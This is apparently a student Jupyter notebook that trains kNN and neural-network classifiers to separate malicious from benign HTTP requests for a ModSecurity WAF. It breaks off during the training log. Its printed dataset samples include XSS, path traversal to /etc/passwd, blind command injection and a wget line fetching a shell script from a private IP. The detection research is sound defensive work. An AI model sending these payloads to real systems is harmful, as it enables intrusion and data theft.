{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0ff36039",
   "metadata": {},
   "source": [
    "# Improving ModSecurity WAF Using a Structured-Language Classifier\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eb50d454",
   "metadata": {},
   "source": [
    "## For Computer Science B.Sc. Ariel University"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "59f4593e",
   "metadata": {},
   "source": [
    "By Maor Saadon, Shahar Zaidel, Eden Mor."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "56246420",
   "metadata": {},
   "source": [
    "# Introdaction"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4936f597",
   "metadata": {},
   "source": [
    "In the ever-evolving landscape of cybersecurity, Web Application Firewalls (WAF) stand as critical defenders against malicious web requests. Traditionally, WAFs rely on predefined rule sets to identify and block potential threats. However, the complexity and sophistication of modern cyber attacks often outpace the capabilities of these rule-based systems, necessitating more dynamic and adaptive approaches. Machine learning (ML), particularly deep learning, has emerged as a promising solution, offering the potential to significantly enhance the detection and mitigation capabilities of WAFs through its ability to learn from data and identify complex patterns.\n",
    "\n",
    "Our research explores the integration of machine learning techniques into the domain of web application security, focusing on the comparative analysis of various ML models in classifying web requests. We delve into models based on advanced text vectorization techniques, such as TF-IDF and Word2Vec, which transform web requests into numerical vectors that capture their semantic essence. These vectors are then utilized by machine learning algorithms, including the traditional k-Nearest Neighbors (kNN) algorithm, to distinguish between benign and malicious requests effectively.\n",
    "\n",
    "Central to our investigation is the exploration of deep learning models in contrast to traditional ML models. Deep learning's capacity for learning hierarchical representations offers a nuanced approach to understanding and classifying web traffic. This leads us to our guiding research question: Does a machine learning model enhanced with deep learning techniques outperform traditional models in the context of Web Application Firewalls?\n",
    "\n",
    "By examining the efficacy of deep learning models against their non-deep learning counterparts, our study aims to shed light on their relative performance and potential for improving the security mechanisms of WAFs. Through this comparative analysis, we aspire to contribute valuable insights into the advancement of cybersecurity methodologies, specifically in enhancing the resilience of web applications against the growing threat of cyber attacks."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d9f46ca",
   "metadata": {},
   "source": [
    "## Install and import libraries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "6d07f0f7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: tensorflow in c:\\users\\maor1\\anaconda3\\lib\\site-packages (2.15.0)Note: you may need to restart the kernel to use updated packages.\n",
      "\n",
      "Requirement already satisfied: tensorflow-intel==2.15.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow) (2.15.0)\n",
      "Requirement already satisfied: absl-py>=1.0.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (2.1.0)\n",
      "Requirement already satisfied: astunparse>=1.6.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (1.6.3)\n",
      "Requirement already satisfied: flatbuffers>=23.5.26 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (23.5.26)\n",
      "Requirement already satisfied: gast!=0.5.0,!=0.5.1,!=0.5.2,>=0.2.1 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (0.5.4)\n",
      "Requirement already satisfied: google-pasta>=0.1.1 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (0.2.0)\n",
      "Requirement already satisfied: h5py>=2.9.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (3.9.0)\n",
      "Requirement already satisfied: libclang>=13.0.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (16.0.6)\n",
      "Requirement already satisfied: ml-dtypes~=0.2.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (0.2.0)\n",
      "Requirement already satisfied: numpy<2.0.0,>=1.23.5 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (1.24.3)\n",
      "Requirement already satisfied: opt-einsum>=2.3.2 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (3.3.0)\n",
      "Requirement already satisfied: packaging in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (23.1)\n",
      "Requirement already satisfied: protobuf!=4.21.0,!=4.21.1,!=4.21.2,!=4.21.3,!=4.21.4,!=4.21.5,<5.0.0dev,>=3.20.3 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (4.25.3)\n",
      "Requirement already satisfied: setuptools in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (68.0.0)\n",
      "Requirement already satisfied: six>=1.12.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (1.16.0)\n",
      "Requirement already satisfied: termcolor>=1.1.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (2.4.0)\n",
      "Requirement already satisfied: typing-extensions>=3.6.6 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (4.7.1)\n",
      "Requirement already satisfied: wrapt<1.15,>=1.11.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (1.14.1)\n",
      "Requirement already satisfied: tensorflow-io-gcs-filesystem>=0.23.1 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (0.31.0)\n",
      "Requirement already satisfied: grpcio<2.0,>=1.24.3 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (1.62.0)\n",
      "Requirement already satisfied: tensorboard<2.16,>=2.15 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (2.15.2)\n",
      "Requirement already satisfied: tensorflow-estimator<2.16,>=2.15.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (2.15.0)\n",
      "Requirement already satisfied: keras<2.16,>=2.15.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorflow-intel==2.15.0->tensorflow) (2.15.0)\n",
      "Requirement already satisfied: wheel<1.0,>=0.23.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from astunparse>=1.6.0->tensorflow-intel==2.15.0->tensorflow) (0.38.4)\n",
      "Requirement already satisfied: google-auth<3,>=1.6.3 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (2.28.1)\n",
      "Requirement already satisfied: google-auth-oauthlib<2,>=0.5 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (1.2.0)\n",
      "Requirement already satisfied: markdown>=2.6.8 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (3.4.1)\n",
      "Requirement already satisfied: requests<3,>=2.21.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (2.31.0)\n",
      "Requirement already satisfied: tensorboard-data-server<0.8.0,>=0.7.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (0.7.2)\n",
      "Requirement already satisfied: werkzeug>=1.0.1 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (2.2.3)\n",
      "Requirement already satisfied: cachetools<6.0,>=2.0.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from google-auth<3,>=1.6.3->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (5.3.2)\n",
      "Requirement already satisfied: pyasn1-modules>=0.2.1 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from google-auth<3,>=1.6.3->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (0.2.8)\n",
      "Requirement already satisfied: rsa<5,>=3.1.4 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from google-auth<3,>=1.6.3->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (4.9)\n",
      "Requirement already satisfied: requests-oauthlib>=0.7.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from google-auth-oauthlib<2,>=0.5->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (1.3.1)\n",
      "Requirement already satisfied: charset-normalizer<4,>=2 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from requests<3,>=2.21.0->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (2.0.4)\n",
      "Requirement already satisfied: idna<4,>=2.5 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from requests<3,>=2.21.0->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (3.4)\n",
      "Requirement already satisfied: urllib3<3,>=1.21.1 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from requests<3,>=2.21.0->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (1.26.16)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from requests<3,>=2.21.0->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (2023.11.17)\n",
      "Requirement already satisfied: MarkupSafe>=2.1.1 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from werkzeug>=1.0.1->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (2.1.1)\n",
      "Requirement already satisfied: pyasn1<0.5.0,>=0.4.6 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from pyasn1-modules>=0.2.1->google-auth<3,>=1.6.3->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (0.4.8)\n",
      "Requirement already satisfied: oauthlib>=3.0.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from requests-oauthlib>=0.7.0->google-auth-oauthlib<2,>=0.5->tensorboard<2.16,>=2.15->tensorflow-intel==2.15.0->tensorflow) (3.2.2)\n",
      "Requirement already satisfied: scikit-learn in c:\\users\\maor1\\anaconda3\\lib\\site-packages (1.3.0)\n",
      "Requirement already satisfied: numpy>=1.17.3 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from scikit-learn) (1.24.3)\n",
      "Requirement already satisfied: scipy>=1.5.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from scikit-learn) (1.11.1)\n",
      "Requirement already satisfied: joblib>=1.1.1 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from scikit-learn) (1.2.0)\n",
      "Requirement already satisfied: threadpoolctl>=2.0.0 in c:\\users\\maor1\\anaconda3\\lib\\site-packages (from scikit-learn) (2.2.0)\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "%pip install tensorflow\n",
    "%pip install scikit-learn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "da6b87b7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "WARNING:tensorflow:From C:\\Users\\shaha\\PycharmProjects\\CMD_final_project\\venv\\Lib\\site-packages\\keras\\src\\losses.py:2976: The name tf.losses.sparse_softmax_cross_entropy is deprecated. Please use tf.compat.v1.losses.sparse_softmax_cross_entropy instead.\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import numpy as np\n",
    "import pandas as pd\n",
    "import tensorflow as tf\n",
    "from tensorflow.keras.preprocessing.text import Tokenizer\n",
    "from tensorflow.keras.preprocessing.sequence import pad_sequences\n",
    "from tensorflow.keras.models import Sequential\n",
    "from tensorflow.keras.layers import Embedding, LSTM, Dense, Dropout\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.feature_extraction.text import TfidfVectorizer\n",
    "import sys\n",
    "import getopt\n",
    "import pandas as pd\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn import metrics\n",
    "from sklearn.model_selection import cross_val_score\n",
    "from sklearn.utils import shuffle\n",
    "import random\n",
    "from sklearn.neighbors import KNeighborsClassifier\n",
    "from sklearn.metrics import accuracy_score, confusion_matrix, classification_report\n",
    "import pickle as pkl\n",
    "from gensim.models import Word2Vec\n",
    "from nltk.tokenize import word_tokenize\n",
    "from sklearn.feature_extraction.text import CountVectorizer\n",
    "import pandas as pd\n",
    "from pandas import DataFrame\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn import metrics\n",
    "from sklearn.model_selection import cross_val_score\n",
    "from sklearn.utils import shuffle\n",
    "import random"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "08339edc",
   "metadata": {},
   "source": [
    "## Feature extraction functions\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "875ba8cf",
   "metadata": {},
   "source": [
    "We will use the following feature extraction functions to extract features from the HTTP request:\n",
    "1. calculate_alphanumeric_ratio - \n",
    "2. calculate_input_length - \n",
    "3. calculate_special_character_ratio - \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "0f7a5135",
   "metadata": {},
   "outputs": [],
   "source": [
    "def calculate_alphanumeric_ratio(payload):\n",
    "    alphanumeric_characters = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')\n",
    "    alphanumeric_count = sum(1 for char in payload if char in alphanumeric_characters)\n",
    "    payload_length = len(payload)\n",
    "    input_length = max(payload_length, 1)  # Avoid division by zero if payload_length is 0\n",
    "    alphanumeric_ratio = (alphanumeric_count / input_length) * 10\n",
    "    return alphanumeric_ratio\n",
    "\n",
    "def calculate_input_length(payload):\n",
    "    input_length = len(payload)\n",
    "    return input_length\n",
    "\n",
    "def calculate_special_character_ratio(payload):\n",
    "    alphanumeric_characters = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')\n",
    "    special_count = sum(1 for char in payload if char not in alphanumeric_characters)\n",
    "    payload_length = len(payload)\n",
    "    input_length = max(payload_length, 1)  # Avoid division by zero if payload_length is 0\n",
    "    special_ratio = (special_count / input_length) * 100\n",
    "    return special_ratio\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e3767a62",
   "metadata": {},
   "source": [
    "# Load and Procces the dataset "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f11b802d",
   "metadata": {},
   "source": [
    "The dataset is a CSV file with two columns: payload and label. The payload column contains the http request payload and the label column contains the label of the http request. The label is 1 if the request is malicious and 0 if the request is benign. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "61629e96",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Balanced Dataset Shape: (98126, 2)\n",
      "Balanced Dataset Distribution: label\n",
      "0    50000\n",
      "1    48126\n",
      "Name: count, dtype: int64\n",
      "Balanced Dataset Head (First 10 Rows):\n",
      "                                             payload  label\n",
      "0  <iframe  src=\"data:text/html,%3C%73%63%72%69%7...      1\n",
      "1                          /javascript/stackdump.exe      1\n",
      "2  &lt;?import namespace=\\\"t\\\" implementation=\\\"#...      1\n",
      "3  /awstats/awstats.pl?migrate=|echo;wget -p /tmp...      1\n",
      "4                                           /146054/      0\n",
      "5                             123+len(1234)-len(123)      1\n",
      "6                                         /revhosts/      0\n",
      "7                                /javascript/devs.7z      0\n",
      "8                       /javascript/certificate.core      0\n",
      "9                               /javascript/item.swf      0\n"
     ]
    }
   ],
   "source": [
    "# Load the dataset\n",
    "df = pd.read_csv('QueriesDataset.csv')\n",
    "# df = df.drop(['method','url','attack_feature'], axis=1)\n",
    "\n",
    "# Shuffle the combined dataset to mix malicious and benign URLs\n",
    "balanced_df = df.sample(frac=1, random_state=42).reset_index(drop=True)\n",
    "\n",
    "print('Balanced Dataset Shape:', balanced_df.shape)\n",
    "print('Balanced Dataset Distribution:', balanced_df['label'].value_counts())\n",
    "print('Balanced Dataset Head (First 10 Rows):')\n",
    "print(balanced_df.head(10))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "45757f91",
   "metadata": {},
   "source": [
    "## Start testing with the options"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "69516ab5",
   "metadata": {},
   "source": [
    "We'll split the truncated dataset into a training set and a test set (80% training, 20% test) and use the training set to train the model and the test set to evaluate the model."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e45b97a4",
   "metadata": {},
   "source": [
    "# W2V Vectorizer preprocessing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "573e7006",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Feature extraction...\n",
      "Balanced Dataset Shape: (98126, 5)\n",
      "Balanced Dataset:\n",
      "                                                 payload  label  payload_len  \\\n",
      "0      <iframe  src=\"data:text/html,%3C%73%63%72%69%7...      1        115.0   \n",
      "1                              /javascript/stackdump.exe      1         25.0   \n",
      "2      &lt;?import namespace=\\\"t\\\" implementation=\\\"#...      1         65.0   \n",
      "3      /awstats/awstats.pl?migrate=|echo;wget -p /tmp...      1        142.0   \n",
      "4                                               /146054/      0          8.0   \n",
      "...                                                  ...    ...          ...   \n",
      "98121                                           /110992/      0          8.0   \n",
      "98122  /recordings/index.php?action=login&languages[n...      1        119.0   \n",
      "98123  /scripts/search.jsp?q=%\"<script>alert(13319041...      1         58.0   \n",
      "98124                                   /quake_4-teaser/      0         16.0   \n",
      "98125                                          /3483441/      0          9.0   \n",
      "\n",
      "          alpha  non_alpha  \n",
      "0      6.695652  33.043478  \n",
      "1      8.800000  12.000000  \n",
      "2      7.076923  29.230769  \n",
      "3      8.098592  19.014085  \n",
      "4      7.500000  25.000000  \n",
      "...         ...        ...  \n",
      "98121  7.500000  25.000000  \n",
      "98122  8.067227  19.327731  \n",
      "98123  7.586207  24.137931  \n",
      "98124  7.500000  25.000000  \n",
      "98125  7.777778  22.222222  \n",
      "\n",
      "[98126 rows x 5 columns]\n",
      "Tokenized requests:\n",
      "\n",
      "\n",
      " [['<iframe  src=\"data:text', 'html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"><', 'iframe>'], ['', 'javascript', 'stackdump.exe'], ['&lt;?import namespace=\\\\\"t\\\\\" implementation=\\\\\"#default#time2\\\\\"&gt;'], ['', 'awstats', 'awstats.pl?migrate=|echo;wget -p ', 'tmp', '  http:', '', '192.168.202.102:80', 'awseggqrffbrbrlxjrml5cgu6gdwaa', 'cbpxmnuvtn.sh;echo|awstats612845.txt'], ['', '146054', ''], ['123+len(1234)-len(123)'], ['', 'revhosts', ''], ['', 'javascript', 'devs.7z'], ['', 'javascript', 'certificate.core'], ['', 'javascript', 'item.swf'], ['', 'help.php?q=\"\\\\x0auname >q61288617 #'], ['', 'main.php?stuff=&del\\\\x09q48138527\\\\x09#'], ['', '174653', ''], ['%27||echo%20NCRWHM$((61%2B27))$(echo%20NCRWHM)NCRWHM%26'], ['', 'purchase-newsletter', ''], ['', 'lib', 'tpl.inc.php?conf[classpath]=http:', '', '192.168.202.96:8080', '4dckqcc0acprbz?'], ['<script>prompt.call`${1}`<', 'script>'], ['%3B%20str%3D%24%28echo%20XNKLKW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C'], ['%7Cecho%20WEFNXM$((36%2B97))$(echo%20WEFNXM)WEFNXM\"'], ['||echo$IFSNWCALI$((76%2B93))$(echo$IFSNWCALI)NWCALI%27'], ['', 'helponconfiguration', ''], ['', 'lovecms', 'install', 'index.php?step=XXpathXX?'], ['', 'javascript', 'automatic.xsl'], ['', '<script>document.cookie=\"testtpby=7052;\"<', 'script>'], ['', 'opensiteadmin', 'scripts', 'classes', 'filters', 'singlefilter.php?path=http:', '', '192.168.202.96:8080', 'llumt7msyau5y?\\\\x00'], ['', '131491', ''], ['', 'scripts', 'phptonuke.php?filnavn=', 'etc', 'passwd'], ['', 'cart32.exe'], ['', 'manager', 'story.pl?next=..', '..', '..', '..', '..', 'etc', 'passwd\\\\x00'], ['', 'caribbean', ''], ['', 'javascript', 'auth.rss'], ['', 'zero-day', ''], ['', 'buybackschemes', ''], ['', 'topleft2', ''], ['', 'soulfly', ''], ['', 'newsletter-subscription', ''], ['', '100786371', ''], ['', '995845_5', ''], ['', 'y-top052', ''], [\"<STYLE>@import'http:\", '', 'xss.cx', \"xss.css';<\", 'STYLE>'], ['\\\\x3e'], ['', 'replicas.save'], ['', 'carson-city', ''], ['', 'scripts', '.nsconfig'], ['', '.', '', '..', '', '.', '', '..', '', '.', '', '..', '', '.', '', '..', '', '.', '', '..', '', '.', '', '..', '', '.', '', '..', '', '{FILE}'], ['', 'examples', 'servlets', 'servlet', 'search.jsp?q=%\"<script>alert(1331904374)<', 'script>'], ['', 'manager', 'inc', 'formmail.inc.php?script_root=..', 'templates', 'mail.tpl.txt\\\\x00'], ['%2522%3B%20str%3D%24%28echo%20AVKIFD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23'], ['', 'jw64yq8u.htm?<script>document.cookie=\"testylfu=1313;\"<', 'script>'], ['\"><object type=\\'text', \"x-html' data='javascript:prompt(\", 'xss', '.source);var x = prompt;x(0);x(', 'XSS', \".source);x'><\", 'object>\",']]\n"
     ]
    }
   ],
   "source": [
    "from gensim.models import Word2Vec\n",
    "from sklearn.model_selection import train_test_split\n",
    "\n",
    "# Apply feature extraction\n",
    "print('Feature extraction...')\n",
    "features = balanced_df['payload'].apply(lambda x: pd.Series({\n",
    "    'payload_len': calculate_input_length(str(x)),\n",
    "    'alpha': calculate_alphanumeric_ratio(str(x)),\n",
    "    'non_alpha': calculate_special_character_ratio(str(x)),\n",
    "    }))\n",
    "\n",
    "\n",
    "# Concatenate original DF with features\n",
    "balanced_df = pd.concat([balanced_df, features], axis=1)\n",
    "print('Balanced Dataset Shape:', balanced_df.shape)\n",
    "print('Balanced Dataset:')\n",
    "print(balanced_df)\n",
    "\n",
    "# Before tokenization, replace NaN values in 'payload'   with empty strings\n",
    "balanced_df['payload'] = balanced_df['payload'].fillna('z')\n",
    "\n",
    "# Tokenize HTTP requests\n",
    "tokenized_requests = [str(request).split('/') for request in balanced_df['payload']]\n",
    "\n",
    "\n",
    "print('Tokenized requests:\\n\\n\\n', tokenized_requests[:50:])\n",
    "\n",
    "\n",
    "# Train Word2Vec model\n",
    "model = Word2Vec(tokenized_requests, vector_size=100, window=4, min_count=1, workers=4)\n",
    "\n",
    "#valid_tokenized_requests = [request for request in tokenized_requests if request]\n",
    "\n",
    "# Convert HTTP requests to vector representations\n",
    "X_combined = np.array([np.mean([model.wv[word] for word in request if word in model.wv], axis=0) for request in tokenized_requests])\n",
    "\n",
    "\n",
    "# Define y\n",
    "y = balanced_df['label'].values\n",
    "\n",
    "\n",
    "# Split the data into training and testing sets\n",
    "X_train, X_test, y_train, y_test = train_test_split(X_combined, y, test_size=0.2, random_state=42)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e2e7554f",
   "metadata": {},
   "source": [
    "# CountVectorizer"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "840aabe4",
   "metadata": {},
   "source": [
    "## K-Nearest Neighbors model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "2b02d59a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "K-Nearest Neighbors training is complete,\n",
      " predictions: \n",
      "[+] \t Classification accuracy :  92.79 %\n",
      "\n",
      "[+] \t Percentage of Anomaly requests in test set :  49.24 %\n",
      "\n",
      "[+] \t Percentage of Normal requests in test set :  50.76 %\n",
      "\n",
      "[+] \t TP :  8721 from  19626\n",
      "    \t TN :  9490 from  19626\n",
      "    \t FP :  472 from  19626\n",
      "    \t FN :  943 from  19626\n",
      "\n",
      "[+] \t Metrics : \n",
      "\t[-]  Accuracy Score (train_test_split):  92.79 %\n",
      "\t[-]  Accuracy Score (k-fold):  93.15 %\n",
      "\t[-]  Classification Error :  7.21 %\n",
      "\t[-]  Recall :  90.24 %\n",
      "\t[-]  Specificity :  95.26 %\n",
      "\t[-]  False Positive Rate :  4.74 %\n",
      "\t[-]  Precision :  94.87 %\n"
     ]
    }
   ],
   "source": [
    "\n",
    "# Create an instance of kNN classifier\n",
    "# the number of neighbors (k= 350) \n",
    "knn_model = KNeighborsClassifier(n_neighbors=350) \n",
    "\n",
    "# Train the kNN model (x_train-train_features,y_train-train_labels)\n",
    "knn_model.fit(X_train, y_train)\n",
    "print(\"K-Nearest Neighbors training is complete,\\n predictions: \")\n",
    "\n",
    "# Predict on the test set\n",
    "predictions = knn_model.predict(X_test)\n",
    "\n",
    "print('[+] \\t Classification accuracy : ', \"{:.2f}\".format(metrics.accuracy_score(y_test, predictions) * 100), '%\\n')\n",
    "\n",
    "print('[+] \\t Percentage of Anomaly requests in test set : ', \"{:.2f}\".format(y_test.mean() * 100), '%\\n')\n",
    "print('[+] \\t Percentage of Normal requests in test set : ', \"{:.2f}\".format((1 - y_test.mean()) * 100), '%\\n')\n",
    "\n",
    "confusion = metrics.confusion_matrix(y_test, predictions)\n",
    "TP = confusion[1, 1]\n",
    "TN = confusion[0, 0]\n",
    "FP = confusion[0, 1]\n",
    "FN = confusion[1, 0]\n",
    "\n",
    "print('[+] \\t TP : ', TP, 'from ', (TP + TN + FP + FN))\n",
    "print('    \\t TN : ', TN, 'from ', (TP + TN + FP + FN))\n",
    "print('    \\t FP : ', FP, 'from ', (TP + TN + FP + FN))\n",
    "print('    \\t FN : ', FN, 'from ', (TP + TN + FP + FN))\n",
    "\n",
    "print('\\n[+] \\t Metrics : ')\n",
    "print('\\t[-]  Accuracy Score (train_test_split): ', \"{:.2f}\".format(metrics.accuracy_score(y_test, predictions) * 100), '%')\n",
    "print('\\t[-]  Accuracy Score (k-fold): ',\n",
    "      \"{:.2f}\".format(cross_val_score(knn_model, X_train, y_train, cv=100, scoring='accuracy').mean() * 100), '%')\n",
    "\n",
    "print('\\t[-]  Classification Error : ', \"{:.2f}\".format((1 - metrics.accuracy_score(y_test, predictions)) * 100), '%')\n",
    "print('\\t[-]  Recall : ', \"{:.2f}\".format(metrics.recall_score(y_test, predictions) * 100), '%')\n",
    "specificity = TN / (TN + FP)\n",
    "print('\\t[-]  Specificity : ', \"{:.2f}\".format(specificity * 100), '%')\n",
    "false_positive_rate = FP / float(TN + FP)\n",
    "print('\\t[-]  False Positive Rate : ', \"{:.2f}\".format(false_positive_rate * 100), '%')\n",
    "precision = TP / float(TP + FP)\n",
    "print('\\t[-]  Precision : ', \"{:.2f}\".format(precision * 100), '%')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b0d2f42c",
   "metadata": {},
   "source": [
    "## TensorFlow neural network, with feature extraction"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "19a4392f",
   "metadata": {},
   "source": [
    "A deep learning model using a Dense Neural Network (DNN), also known as a Fully Connected Network. This type of neural network architecture is characterized by its layers of neurons where each neuron in one layer is connected to all neurons in the next layer."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "9e58bf6a",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch 1/10\n",
      "1963/1963 [==============================] - 7s 3ms/step - loss: 0.3383 - accuracy: 0.8587 - val_loss: 0.2592 - val_accuracy: 0.9246\n",
      "Epoch 2/10\n",
      "1963/1963 [==============================] - 6s 3ms/step - loss: 0.2974 - accuracy: 0.8858 - val_loss: 0.2535 - val_accuracy: 0.9327\n",
      "Epoch 3/10\n",
      "1963/1963 [==============================] - 6s 3ms/step - loss: 0.3125 - accuracy: 0.8717 - val_loss: 0.2475 - val_accuracy: 0.9338\n",
      "Epoch 4/10\n",
      "1963/1963 [==============================] - 6s 3ms/step - loss: 0.2864 - accuracy: 0.8986 - val_loss: 0.3245 - val_accuracy: 0.9336\n",
      "Epoch 5/10\n",
      "1963/1963 [==============================] - 6s 3ms/step - loss: 0.2838 - accuracy: 0.8980 - val_loss: 0.4462 - val_accuracy: 0.9329\n",
      "Epoch 6/10\n",
      "1963/1963 [==============================] - 6s 3ms/step - loss: 0.2823 - accuracy: 0.9010 - val_loss: 0.4977 - val_accuracy: 0.5455\n",
      "Epoch 7/10\n",
      "1963/1963 [==============================] - 6s 3ms/step - loss: 0.2968 - accuracy: 0.8978 - val_loss: 0.6023 - val_accuracy: 0.5446\n",
      "Epoch 8/10\n",
      "1963/1963 [==============================] - 8s 4ms/step - loss: 0.2954 - accuracy: 0.8969 - val_loss: 0.5403 - val_accuracy: 0.5454\n",
      "Epoch 9/10\n",
      "1963/1963 [==============================] - 7s 4ms/step - loss: 0.2835 - accuracy: 0.9013 - val_loss: 0.4199 - val_accuracy: 0.9338\n",
